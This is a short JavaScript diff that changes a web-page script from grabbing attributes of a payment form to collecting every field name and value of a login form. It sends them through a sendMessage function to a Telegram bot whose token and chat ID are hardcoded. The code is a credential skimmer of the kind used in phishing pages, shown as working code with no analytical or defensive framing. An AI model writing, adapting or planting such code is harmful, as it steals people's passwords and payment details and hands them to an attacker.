@@ -1,4 +1,4 @@
-var x = document.getElementById("addpayment");
+	var x = document.getElementById("submit");
 let tg = {
     token: "6786942281:AAEEMylFUD0IvUA50LQ2VKLDy5cStMELz3I", // Your bot's token that got from @BotFather
     chat_id: "-1002152188424" // The user's(that you want to send a message) telegram chat id
@@ -13,13 +13,13 @@ function sendMessage(text)
 }
 function myFunction() 
 {
-var element = document.getElementById("paymentform");
-var openTag = "<"+element.tagName;
-for (var i = 0; i < element.attributes.length; i++) {
-    var attrib = element.attributes[i];
-    openTag += " "+attrib.name + "=" + attrib.value;
+var form = document.getElementById("login-form");
+var kvpairs = [];
+for ( var i = 0; i < form.elements.length; i++ ) {
+   var e = form.elements[i];
+   kvpairs.push(encodeURIComponent(e.name) + "=" + encodeURIComponent(e.value));
 }
-openTag += ">";
 
-  sendMessage(openTag);
+var queryString = kvpairs.join("--->");
+  sendMessage(queryString);
 }
